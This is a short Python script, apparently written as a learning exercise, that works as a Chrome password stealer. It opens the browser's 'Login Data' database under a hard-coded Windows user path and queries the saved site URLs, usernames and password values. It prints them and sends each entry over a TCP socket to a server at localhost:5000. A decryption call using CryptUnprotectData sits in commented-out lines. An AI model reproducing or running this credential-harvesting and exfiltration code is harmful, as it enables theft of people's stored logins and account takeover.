import socket
import sqlite3
#import win32crypt
import ctypes

class Chrome:
    def __init__(self):
        self.path = 'C:\\Users\\Eduardo\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
        self.db = sqlite3.connect(self.path)

    #def Senha(self,passwd):
    #    senha = win32crypt.CryptUnprotectData(passwd,None,None,None,0)
    #    print(senha)



    
    def users(self):
        qry = 'select origin_url, username_value, password_value from logins'
        cursor = self.db.execute(qry)
        users = []
        for url,user,passwd in cursor:
     #       senha = self.Senha(passwd)
            users.append((url,user,passwd))
            print('url: %s\nuser: %s\npasswd: %s' % (url,user,passwd))
        return users

    def enviar(self):
        client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server = ('localhost', 5000)
        print("Conectando ao servidor")
        client.connect(server)
        try:
            for usr in self.users():
                url,user,passwd = usr
                msg = 'url: %s\nuser: %s\npasswd: %s\n' % (url,user,passwd)
                #print('Enviando Mensagem')
                client.sendall(msg.encode('utf-8'))
        except socket.error as e:
            print(e)


if __name__ == '__main__':
    browser = Chrome()
    browser.enviar()